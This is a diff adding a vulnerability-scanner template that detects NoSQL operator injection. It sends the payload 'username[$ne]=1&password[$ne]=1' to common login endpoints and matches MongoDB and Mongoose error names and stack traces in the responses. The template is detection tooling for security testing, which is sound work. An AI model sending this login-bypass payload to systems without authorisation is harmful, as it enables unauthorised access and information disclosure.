@@ -1,0 +1,63 @@
+# gap: nosql-injection-operator-error
+id: nosql-injection-operator-error
+
+info:
+  name: NoSQL Operator Injection — MongoDB/Mongoose Error Class Disclosed
+  author: TyrusRC
+  severity: high
+  description: |
+    POSTs URL-encoded operator-injection payloads (username[$ne]=1 &
+    password[$ne]=1) to common login/auth endpoints. Frameworks that
+    parse nested query syntax (Express qs/body-parser, Koa, Hapi) will
+    unbox these into MongoDB query operators; un-sanitised handlers
+    then surface BSON/Mongoose error class names in the response when
+    the type coerce fails. Matches on specific driver class names
+    (MongoError, MongooseError, CastError, BSONError, BSONTypeError)
+    rather than generic "error" strings to avoid noise. This is family
+    detection for the operator-unboxing NoSQL injection class and
+    replays on future variants regardless of CVE.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+    - https://cwe.mitre.org/data/definitions/943.html
+    - https://www.mongodb.com/docs/manual/reference/operator/query/ne/
+  tags: custom,vulnerabilities,nosql,injection,mongodb,mongoose,owasp
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: application/json
+
+        username[%24ne]=1&password[%24ne]=1
+    payloads:
+      path:
+        - "/login"
+        - "/api/login"
+        - "/auth"
+        - "/api/auth"
+        - "/signin"
+        - "/api/v1/login"
+        - "/users/login"
+        - "/api/auth/login"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 500
+      - type: dsl
+        dsl:
+          - 'contains(body, "MongoError") || contains(body, "MongooseError") || contains(body, "CastError") || contains(body, "BSONError") || contains(body, "BSONTypeError") || contains(body, "MongoServerError") || contains(body, "MongoNetworkError")'
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '(MongoError|MongooseError|CastError|BSONError|BSONTypeError|MongoServerError|MongoNetworkError)'
+      - type: regex
+        part: body
+        regex:
+          - 'at\s+[A-Za-z_][A-Za-z0-9_.<>]+\s*\([^)]{0,120}\)'
